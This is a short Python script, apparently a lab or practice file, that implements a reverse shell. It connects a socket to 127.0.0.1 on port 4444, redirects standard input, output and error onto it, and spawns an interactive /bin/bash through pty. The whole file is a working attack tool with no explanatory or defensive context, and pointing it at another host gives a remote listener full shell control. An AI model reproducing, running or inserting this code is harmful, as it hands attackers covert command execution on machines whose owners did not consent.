import socket
import pty
import os

ip = '127.0.0.1'

porta = 4444

s = socket.socket()

s.connect((ip, porta))

for fd in (0, 1, 2):
	os.dup2(s.fileno(), fd)
	
pty.spawn('/bin/bash')